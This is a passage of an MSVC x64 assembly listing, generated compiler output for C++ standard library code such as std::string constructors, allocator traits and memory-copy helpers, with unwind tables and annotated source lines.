xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z DB 028H
	DD	imagerel $stateUnwindMap$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z
	DD	imagerel $ip2state$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z DD 011311H
	DD	06213H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z DB 06H
	DB	00H
	DB	00H
	DB	'p'
	DB	02H
	DB	'H'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z DB 028H
	DD	imagerel $stateUnwindMap$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z
	DD	imagerel $ip2state$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z DD 010e11H
	DD	0620eH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Xran@?$_String_val@U?$_Simple_types@D@std@@@std@@SAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Check_offset@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAX_K@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Large_string_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBA_NXZ DD 010901H
	DD	02209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAPEBDXZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAAPEADXZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?allocate@?$allocator@D@std@@QEAAPEAD_K@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?deallocate@?$allocator@D@std@@QEAAXQEAD_K@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Xlen_string@std@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NAEBH0@Z DD 010e01H
	DD	0220eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?assign@?$_Narrow_char_traits@DH@std@@SAPEADQEAD_KD@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?find@?$_Narrow_char_traits@DH@std@@SAPEBDQEBD_KAEBD@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?length@?$_Narrow_char_traits@DH@std@@SA_KQEBD@Z DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?compare@?$_Narrow_char_traits@DH@std@@SAHQEBD0_K@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?move@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?eq_int_type@?$_WChar_traits@_W@std@@SA_NAEBG0@Z DD 010e01H
	DD	0220eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?find@?$_WChar_traits@_W@std@@SAPEB_WPEB_W_KAEB_W@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?compare@?$_WChar_traits@_W@std@@SAHQEB_W0_K@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z DD 010e01H
	DD	0820eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Throw_bad_array_new_length@std@@YAXXZ DD 010401H
	DD	08204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_array_new_length@std@@UEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_array_new_length@std@@QEAA@AEBV01@@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1bad_array_new_length@std@@UEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_array_new_length@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_alloc@std@@UEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_alloc@std@@QEAA@AEBV01@@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1bad_alloc@std@@UEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_alloc@std@@AEAA@QEBD@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gexception@std@@UEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?what@exception@std@@UEBAPEBDXZ DD 010901H
	DD	02209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1exception@std@@UEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@AEBV01@@Z DD 020f01H
	DD	0700b320fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@QEBDH@Z DD 011001H
	DD	07010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@QEBD@Z DD 020f01H
	DD	0700b520fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$wmemcmp DD 011301H
	DD	02213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$sprintf_s DD 011801H
	DD	08218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$_vsprintf_s_l DD 011801H
	DD	08218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$printf DD 011801H
	DD	06218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$_vfprintf_l DD 011801H
	DD	06218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$frexpl DD 010f01H
	DD	0420fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$fabsl DD 010a01H
	DD	0420aH
xdata	ENDS
CRT$XCU	SEGMENT
?syscallID$initializer$@@3P6AXXZEA DQ FLAT:??__EsyscallID@@YAXXZ ; syscallID$initializer$
CRT$XCU	ENDS
;	COMDAT CRT$XCU
CRT$XCU	SEGMENT
??id$initializer$@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2P6AXXZEA@@3P6AXXZEA DQ FLAT:??__E?id@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2V0locale@2@A@@YAXXZ ; ??id$initializer$@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2P6AXXZEA@@3P6AXXZEA
CRT$XCU	ENDS
;	COMDAT CRT$XCU
CRT$XCU	SEGMENT
??id$initializer$@?$numpunct@D@std@@2P6AXXZEA@@3P6AXXZEA DQ FLAT:??__E?id@?$numpunct@D@std@@2V0locale@2@A@@YAXXZ ; ??id$initializer$@?$numpunct@D@std@@2P6AXXZEA@@3P6AXXZEA
CRT$XCU	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$construct@DD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEAD$$QEAD@Z
_TEXT	SEGMENT
$T1 = 32
__formal$ = 64
_Ptr$ = 72
<_Args_0>$ = 80
??$construct@DD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEAD$$QEAD@Z PROC ; std::_Default_allocator_traits<std::allocator<char> >::construct<char,char>, COMDAT

; 675  :     static _CONSTEXPR20 void construct(_Alloc&, _Objty* const _Ptr, _Types&&... _Args) {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 676  : #if _HAS_CXX20
; 677  :         if (_STD is_constant_evaluated()) {
; 678  :             _STD construct_at(_Ptr, _STD forward<_Types>(_Args)...);
; 679  :         } else
; 680  : #endif // _HAS_CXX20
; 681  :         {
; 682  :             ::new (_Voidify_iter(_Ptr)) _Objty(_STD forward<_Types>(_Args)...);

	mov	rcx, QWORD PTR _Ptr$[rsp]
	call	??$_Voidify_iter@PEAD@std@@YAPEAXPEAD@Z	; std::_Voidify_iter<char *>
	mov	rdx, rax
	mov	ecx, 1
	call	??2@YAPEAX_KPEAX@Z			; operator new
	mov	QWORD PTR $T1[rsp], rax
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	call	??$forward@D@std@@YA$$QEADAEAD@Z	; std::forward<char>
	mov	rcx, QWORD PTR $T1[rsp]
	movzx	eax, BYTE PTR [rax]
	mov	BYTE PTR [rcx], al

; 683  :         }
; 684  :     }

	add	rsp, 56					; 00000038H
	ret	0
??$construct@DD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEAD$$QEAD@Z ENDP ; std::_Default_allocator_traits<std::allocator<char> >::construct<char,char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$forward@D@std@@YA$$QEADAEAD@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@D@std@@YA$$QEADAEAD@Z PROC			; std::forward<char>, COMDAT

; 1411 :     remove_reference_t<_Ty>& _Arg) noexcept { // forward an lvalue as either an lvalue or an rvalue

	mov	QWORD PTR [rsp+8], rcx

; 1412 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1413 : }

	ret	0
??$forward@D@std@@YA$$QEADAEAD@Z ENDP			; std::forward<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_To_address@PEAD@std@@YA?A_PAEBQEAD@Z
_TEXT	SEGMENT
_Val$ = 8
??$_To_address@PEAD@std@@YA?A_PAEBQEAD@Z PROC		; std::_To_address<char *>, COMDAT

; 4023 : _NODISCARD constexpr auto _To_address(const _Iter& _Val) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 4024 :     _STL_INTERNAL_STATIC_ASSERT(is_pointer_v<_Iter>);
; 4025 :     return _Val;

	mov	rax, QWORD PTR _Val$[rsp]
	mov	rax, QWORD PTR [rax]

; 4026 : }

	ret	0
??$_To_address@PEAD@std@@YA?A_PAEBQEAD@Z ENDP		; std::_To_address<char *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$construct@EE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAE$$QEAE@Z
_TEXT	SEGMENT
$T1 = 32
__formal$ = 64
_Ptr$ = 72
<_Args_0>$ = 80
??$construct@EE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAE$$QEAE@Z PROC ; std::_Default_allocator_traits<std::allocator<unsigned char> >::construct<unsigned char,unsigned char>, COMDAT

; 675  :     static _CONSTEXPR20 void construct(_Alloc&, _Objty* const _Ptr, _Types&&... _Args) {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 676  : #if _HAS_CXX20
; 677  :         if (_STD is_constant_evaluated()) {
; 678  :             _STD construct_at(_Ptr, _STD forward<_Types>(_Args)...);
; 679  :         } else
; 680  : #endif // _HAS_CXX20
; 681  :         {
; 682  :             ::new (_Voidify_iter(_Ptr)) _Objty(_STD forward<_Types>(_Args)...);

	mov	rcx, QWORD PTR _Ptr$[rsp]
	call	??$_Voidify_iter@PEAE@std@@YAPEAXPEAE@Z	; std::_Voidify_iter<unsigned char *>
	mov	rdx, rax
	mov	ecx, 1
	call	??2@YAPEAX_KPEAX@Z			; operator new
	mov	QWORD PTR $T1[rsp], rax
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	call	??$forward@E@std@@YA$$QEAEAEAE@Z	; std::forward<unsigned char>
	mov	rcx, QWORD PTR $T1[rsp]
	movzx	eax, BYTE PTR [rax]
	mov	BYTE PTR [rcx], al

; 683  :         }
; 684  :     }

	add	rsp, 56					; 00000038H
	ret	0
??$construct@EE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAE$$QEAE@Z ENDP ; std::_Default_allocator_traits<std::allocator<unsigned char> >::construct<unsigned char,unsigned char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$forward@E@std@@YA$$QEAEAEAE@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@E@std@@YA$$QEAEAEAE@Z PROC			; std::forward<unsigned char>, COMDAT

; 1411 :     remove_reference_t<_Ty>& _Arg) noexcept { // forward an lvalue as either an lvalue or an rvalue

	mov	QWORD PTR [rsp+8], rcx

; 1412 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1413 : }

	ret	0
??$forward@E@std@@YA$$QEAEAEAE@Z ENDP			; std::forward<unsigned char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_To_address@PEAE@std@@YA?A_PAEBQEAE@Z
_TEXT	SEGMENT
_Val$ = 8
??$_To_address@PEAE@std@@YA?A_PAEBQEAE@Z PROC		; std::_To_address<unsigned char *>, COMDAT

; 4023 : _NODISCARD constexpr auto _To_address(const _Iter& _Val) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 4024 :     _STL_INTERNAL_STATIC_ASSERT(is_pointer_v<_Iter>);
; 4025 :     return _Val;

	mov	rax, QWORD PTR _Val$[rsp]
	mov	rax, QWORD PTR [rax]

; 4026 : }

	ret	0
??$_To_address@PEAE@std@@YA?A_PAEBQEAE@Z ENDP		; std::_To_address<unsigned char *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$construct@_W_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_W$$QEA_W@Z
_TEXT	SEGMENT
$T1 = 32
__formal$ = 64
_Ptr$ = 72
<_Args_0>$ = 80
??$construct@_W_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_W$$QEA_W@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::construct<wchar_t,wchar_t>, COMDAT

; 675  :     static _CONSTEXPR20 void construct(_Alloc&, _Objty* const _Ptr, _Types&&... _Args) {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 676  : #if _HAS_CXX20
; 677  :         if (_STD is_constant_evaluated()) {
; 678  :             _STD construct_at(_Ptr, _STD forward<_Types>(_Args)...);
; 679  :         } else
; 680  : #endif // _HAS_CXX20
; 681  :         {
; 682  :             ::new (_Voidify_iter(_Ptr)) _Objty(_STD forward<_Types>(_Args)...);

	mov	rcx, QWORD PTR _Ptr$[rsp]
	call	??$_Voidify_iter@PEA_W@std@@YAPEAXPEA_W@Z ; std::_Voidify_iter<wchar_t *>
	mov	rdx, rax
	mov	ecx, 2
	call	??2@YAPEAX_KPEAX@Z			; operator new
	mov	QWORD PTR $T1[rsp], rax
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	call	??$forward@_W@std@@YA$$QEA_WAEA_W@Z	; std::forward<wchar_t>
	mov	rcx, QWORD PTR $T1[rsp]
	movzx	eax, WORD PTR [rax]
	mov	WORD PTR [rcx], ax

; 683  :         }
; 684  :     }

	add	rsp, 56					; 00000038H
	ret	0
??$construct@_W_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_W$$QEA_W@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::construct<wchar_t,wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$forward@_W@std@@YA$$QEA_WAEA_W@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@_W@std@@YA$$QEA_WAEA_W@Z PROC		; std::forward<wchar_t>, COMDAT

; 1411 :     remove_reference_t<_Ty>& _Arg) noexcept { // forward an lvalue as either an lvalue or an rvalue

	mov	QWORD PTR [rsp+8], rcx

; 1412 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1413 : }

	ret	0
??$forward@_W@std@@YA$$QEA_WAEA_W@Z ENDP		; std::forward<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_To_address@PEA_W@std@@YA?A_PAEBQEA_W@Z
_TEXT	SEGMENT
_Val$ = 8
??$_To_address@PEA_W@std@@YA?A_PAEBQEA_W@Z PROC		; std::_To_address<wchar_t *>, COMDAT

; 4023 : _NODISCARD constexpr auto _To_address(const _Iter& _Val) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 4024 :     _STL_INTERNAL_STATIC_ASSERT(is_pointer_v<_Iter>);
; 4025 :     return _Val;

	mov	rax, QWORD PTR _Val$[rsp]
	mov	rax, QWORD PTR [rax]

; 4026 : }

	ret	0
??$_To_address@PEA_W@std@@YA?A_PAEBQEA_W@Z ENDP		; std::_To_address<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Emplace_back@D@?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAAX$$QEAD@Z
_TEXT	SEGMENT
tv64 = 32
this$ = 64
<_Vals_0>$ = 72
??$_Emplace_back@D@?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAAX$$QEAD@Z PROC ; std::_Uninitialized_backout_al<std::allocator<char> >::_Emplace_back<char>, COMDAT

; 1661 :     _CONSTEXPR20 void _Emplace_back(_Types&&... _Vals) { // construct a new element at *_Last and increment

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 1662 :         allocator_traits<_Alloc>::construct(_Al, _Unfancy(_Last), _STD forward<_Types>(_Vals)...);

	mov	rcx, QWORD PTR <_Vals_0>$[rsp]
	call	??$forward@D@std@@YA$$QEADAEAD@Z	; std::forward<char>
	mov	QWORD PTR tv64[rsp], rax
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx+8]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	mov	rcx, QWORD PTR tv64[rsp]
	mov	r8, rcx
	mov	rdx, rax
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax+16]
	call	??$construct@DD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEAD$$QEAD@Z ; std::_Default_allocator_traits<std::allocator<char> >::construct<char,char>

; 1663 :         ++_Last;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]
	inc	rax
	mov	rcx, QWORD PTR this$[rsp]
	mov	QWORD PTR [rcx+8], rax

; 1664 :     }

	add	rsp, 56					; 00000038H
	ret	0
??$_Emplace_back@D@?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAAX$$QEAD@Z ENDP ; std::_Uninitialized_backout_al<std::allocator<char> >::_Emplace_back<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Release@?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 8
?_Release@?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAAPEADXZ PROC ; std::_Uninitialized_backout_al<std::allocator<char> >::_Release, COMDAT

; 1666 :     constexpr pointer _Release() { // suppress any exception handling backout and return _Last

	mov	QWORD PTR [rsp+8], rcx

; 1667 :         _First = _Last;

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx+8]
	mov	QWORD PTR [rax], rcx

; 1668 :         return _Last;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]

; 1669 :     }

	ret	0
?_Release@?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAAPEADXZ ENDP ; std::_Uninitialized_backout_al<std::allocator<char> >::_Release
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??1?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAA@XZ PROC ; std::_Uninitialized_backout_al<std::allocator<char> >::~_Uninitialized_backout_al<std::allocator<char> >, COMDAT

; 1656 :     _CONSTEXPR20 ~_Uninitialized_backout_al() {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 1657 :         _Destroy_range(_First, _Last, _Al);

	mov	rax, QWORD PTR this$[rsp]
	mov	r8, QWORD PTR [rax+16]
	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rax+8]
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Destroy_range@V?$allocator@D@std@@@std@@YAXPEADQEADAEAV?$allocator@D@0@@Z ; std::_Destroy_range<std::allocator<char> >

; 1658 :     }

	add	rsp, 40					; 00000028H
	ret	0
??1?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAA@XZ ENDP ; std::_Uninitialized_backout_al<std::allocator<char> >::~_Uninitialized_backout_al<std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??0?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAA@PEADAEAV?$allocator@D@1@@Z
_TEXT	SEGMENT
this$ = 8
_Dest$ = 16
_Al_$ = 24
??0?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAA@PEADAEAV?$allocator@D@1@@Z PROC ; std::_Uninitialized_backout_al<std::allocator<char> >::_Uninitialized_backout_al<std::allocator<char> >, COMDAT

; 1651 :     _CONSTEXPR20 _Uninitialized_backout_al(pointer _Dest, _Alloc& _Al_) : _First(_Dest), _Last(_Dest), _Al(_Al_) {}

	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Dest$[rsp]
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Dest$[rsp]
	mov	QWORD PTR [rax+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Al_$[rsp]
	mov	QWORD PTR [rax+16], rcx
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAA@PEADAEAV?$allocator@D@1@@Z ENDP ; std::_Uninitialized_backout_al<std::allocator<char> >::_Uninitialized_backout_al<std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Copy_memmove@PEADPEAD@std@@YAPEADPEAD00@Z
_TEXT	SEGMENT
_First_ch$ = 32
_Count$ = 40
_Dest_ch$ = 48
_FirstPtr$ = 56
_LastPtr$ = 64
_DestPtr$ = 72
_Last_ch$ = 80
_First$ = 112
_Last$ = 120
_Dest$ = 128
??$_Copy_memmove@PEADPEAD@std@@YAPEADPEAD00@Z PROC	; std::_Copy_memmove<char *,char *>, COMDAT

; 4112 : _OutCtgIt _Copy_memmove(_CtgIt _First, _CtgIt _Last, _OutCtgIt _Dest) {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 104				; 00000068H

; 4113 :     auto _FirstPtr              = _To_address(_First);

	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_To_address@PEAD@std@@YA?A_PAEBQEAD@Z ; std::_To_address<char *>
	mov	QWORD PTR _FirstPtr$[rsp], rax

; 4114 :     auto _LastPtr               = _To_address(_Last);

	lea	rcx, QWORD PTR _Last$[rsp]
